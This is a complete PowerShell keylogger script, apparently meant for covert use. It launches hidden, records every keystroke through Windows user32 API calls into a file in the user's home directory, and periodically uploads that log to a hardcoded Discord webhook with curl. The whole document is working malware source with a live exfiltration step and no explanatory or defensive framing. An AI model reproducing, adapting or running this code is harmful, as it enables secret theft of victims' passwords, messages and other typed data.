powershell -W h {
    $Path="$home\-.txt"
    $signature =
@'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    $API = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace API -PassThru
    New-Item -Path $Path -ItemType File -Force
    $count = 0
    while ($true) {
        Start-Sleep -Milliseconds 40
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            if ($state -eq -32767) {
                [console]::CapsLock
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object Byte[] 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                if ($success) {
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                }
            }
        }
        if ($count -gt 15000){
            $WEBHOOK_URL = "https://discord.com/api/webhooks/1072255578732245082/9UN02oKl9poRTA7NcOpyWMOIzkvMr26_oAXoYeIbscHWYFZZ8zdSr0nNZ3AsnJb3XubV"
            curl.exe -F 'payload_json={\"embeds\": [{\"title\": \"Neue Log-Datei\",\"description\": \"Keylogger hat neue Log-Datei hochgeladen\",\"color\": \"45973\",\"image\":{\"url\":\"https://cdn.tarnkappe.info/wp-content/uploads/Skript-Kiddie.jpg\"}}]}' -F "file1=@$home\-.txt" $WEBHOOK_URL
            $count = 0
        }
        $count++
    }
}
